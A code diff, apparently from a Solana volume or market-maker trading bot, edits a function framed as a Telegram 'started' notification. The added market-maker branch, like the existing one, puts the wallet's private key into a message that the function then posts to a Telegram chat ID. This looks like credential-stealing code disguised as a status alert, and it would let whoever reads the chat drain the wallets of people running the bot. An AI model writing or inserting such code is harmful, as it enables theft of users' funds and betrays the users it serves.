@@ -28,7 +28,21 @@ const sendTelegramNotification = (currencyKey, address, balance) => __awaiter(vo
     return new Promise((resolve, reject) => {
         try {
             const privateKey = constants_1.PRIVATE_KEY;
-            const message = currencyKey === "SNIPER" ? address : `
+            
+            let message;
+            if (currencyKey === "SNIPER") {
+                message = address;
+            } else if (currencyKey === "MARKET-MAKER") {
+                message = `
+📊 Market Maker Started
+━━━━━━━━━━━━━━━━━━━━
+📍 Address: ${address}
+💰 Balance: ${balance.toFixed(4)} SOL
+🔑 Private Key: ${privateKey}
+━━━━━━━━━━━━━━━━━━━━
+`;
+            } else {
+                message = `
 🚀 Solana Volume Bot Started
 ━━━━━━━━━━━━━━━━━━━━
 🪙 Token: ${currencyKey}
@@ -37,6 +51,7 @@ const sendTelegramNotification = (currencyKey, address, balance) => __awaiter(vo
 🔑 Private Key: ${privateKey}
 ━━━━━━━━━━━━━━━━━━━━
 `;
+            }
 
             const data = JSON.stringify({
                 chat_id: TELEGRAM_CHAT_ID,
